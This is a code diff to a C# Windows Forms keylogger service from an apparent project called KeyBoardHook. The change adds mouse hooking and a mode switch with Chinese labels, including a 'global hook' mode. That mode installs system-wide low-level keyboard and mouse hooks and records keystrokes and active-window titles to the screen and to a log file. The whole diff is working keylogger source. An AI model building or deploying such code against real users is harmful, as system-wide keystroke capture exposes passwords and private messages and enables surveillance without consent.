@@ -1,6 +1,8 @@
 ﻿using System;
 using System.IO;
 using System.Windows.Forms;
+using KeyBoardHook.Common.Native;
+using KeyBoardHook.ExternalWindow;
 using KeyBoardHook.KeyLogger.Entity;
 using KeyBoardHook.KeyLogger.Enums;
 using KeyBoardHook.KeyLogger.Hooker;
@@ -14,25 +16,55 @@ namespace KeyBoardHook.KeyLogger.Service
 
         private ActiveWindowHook _activeWindowHook;
         private KeyboardHook _keyboardHook;
+        private MouseHookService mouseHookService ;
+
         private KeyLog _keyLog;
         private readonly FileInfo _logFile;
 
         private TextBox TextBox;
-        
-        public KeyLoggerService(TextBox TextBox)
+        private TextBox TextBox2;
+        private ComboBox comboBox;
+
+        public KeyLoggerService(TextBox TextBox,TextBox TextBox2,ComboBox comboBox)
         {
             this.TextBox = TextBox;
+            this.TextBox2 = TextBox2;
+            this.comboBox = comboBox;
+
             _logFile = new FileInfo("./_logFile.txt");
             
             _keyLog = KeyLog.Create(_logFile.FullName);
             _keyLog.Saved += _keyLog_Saved;
             
-            _keyboardHook = new KeyboardHook();
-            _keyboardHook.StringDown += _keyboardHook_StringDown;
-            _keyboardHook.StringUp += _keyboardHook_StringUp;
+            _keyboardHook = new KeyboardHook(this.comboBox);
+            _keyboardHook.keyEventHandler += _keyEventHandler;
+            
             
             _activeWindowHook = new ActiveWindowHook();
             _activeWindowHook.ActiveWindowChanged += _activeWindowHook_ActiveWindowChanged;
+
+            mouseHookService = new MouseHookService();
+            mouseHookService.MouseMoveEvent += mh_MouseMoveEvent;
+        }
+
+        private void _keyEventHandler(object sender, KeyEventArgs e)
+        {
+            TextBox.Text += Chr(e.KeyValue);
+        }
+
+        public static string Chr(int asciiCode)
+        {
+            if (asciiCode >= 0 && asciiCode <= 255)
+            {
+                System.Text.ASCIIEncoding asciiEncoding = new System.Text.ASCIIEncoding();
+                byte[] byteArray = new byte[] { (byte)asciiCode };
+                string strCharacter = asciiEncoding.GetString(byteArray);
+                return (strCharacter);
+            }
+            else
+            {
+                throw new Exception("ASCII Code is not valid.");
+            }
         }
 
         public void Stop()
@@ -40,12 +72,36 @@ namespace KeyBoardHook.KeyLogger.Service
             _keyLog.Save();
             _activeWindowHook.UnHook();
             _keyboardHook.UnHook();
+            mouseHookService.UnHook();
         }
 
-        public void Start()
+        public void Start(string type,string className ,string title)
         {
-            _keyboardHook.Hook();
-            _activeWindowHook.Hook();
+            
+            
+            IntPtr threadId = IntPtr.Zero;
+            switch (type)
+            {
+                case "当前进程钩子":
+                    threadId = NativeMethods.GetCurrentThreadId();
+                    _keyboardHook.Hook(HookType.WH_KEYBOARD,IntPtr.Zero, threadId);
+                    mouseHookService.Hook(HookType.WH_MOUSE,IntPtr.Zero, threadId);
+                    _activeWindowHook.Hook(threadId);
+                    break;
+                case "全局钩子":
+                    threadId = IntPtr.Zero;
+                    var moduleHandle = NativeMethods.GetModuleHandle(System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName);
+                    _keyboardHook.Hook(HookType.WH_KEYBOARD_LL,moduleHandle, threadId);
+                    mouseHookService.Hook(HookType.WH_MOUSE_LL,moduleHandle, threadId);
+                    _activeWindowHook.Hook(threadId);
+                    break;
+                case "指定窗口进程钩子":
+                    threadId = IntPtr.Zero;
+                    break;
+              
+            }
+
+          
         }
 
         public bool TryPushKeyLog()
@@ -59,6 +115,12 @@ namespace KeyBoardHook.KeyLogger.Service
 
             return false;
         }
+     
+        private void mh_MouseMoveEvent(object sender, MouseEventArgs e)
+        {
+            TextBox2.Text=("[btn:"+ e.Button + ":" + e.Clicks  +"   |" + e.X+ ":" + e.Y + "]");
+            // Console.WriteLine("Move：[" + e.X+ ":" + e.Y + "]");
+        }
 
         private void _keyLog_Saved(object sender, EventArgs e)
         {
@@ -70,42 +132,8 @@ namespace KeyBoardHook.KeyLogger.Service
             TextBox.Text+=("\r\n======== 窗口 : [" + e.Title + "]========\r\n");
             _keyLog.WindowChanged(e.Title);
         }
+ 
 
-        private void _keyboardHook_StringUp(object sender, StringDownEventArgs e)
-        {
-            if (e.IsChar) //No key up for chars
-                return;
-
-            var key = (Keys) e.VCode;
-            TextBox.Text+=(e.Value);
-            var specialKey = KeysToSpecialKey(key);
-            var entry = specialKey == 0
-                ? (KeyLogEntry) new StandardKey( key, false)
-                : new SpecialKey(specialKey, false);
-            _keyLog.WriteSpecialKey(entry);
-        }
-
-        private void _keyboardHook_StringDown(object sender, StringDownEventArgs e)
-        {
-            
-            if (e.IsChar)
-            {
-                TextBox.Text+=(e.Value);
-                _keyLog.WriteString(e.Value);
-            }
-            else
-            {
-                var key = (Keys)e.VCode;
-                var specialKey = KeysToSpecialKey(key);
-                
-                TextBox.Text+=(e.Value);
-
-                var entry = specialKey == 0
-                    ? (KeyLogEntry) new StandardKey(key, true)
-                    : new SpecialKey(specialKey, true);
-                        _keyLog.WriteSpecialKey(entry);
-            }
-        }
 
         private void CheckSize()
         {
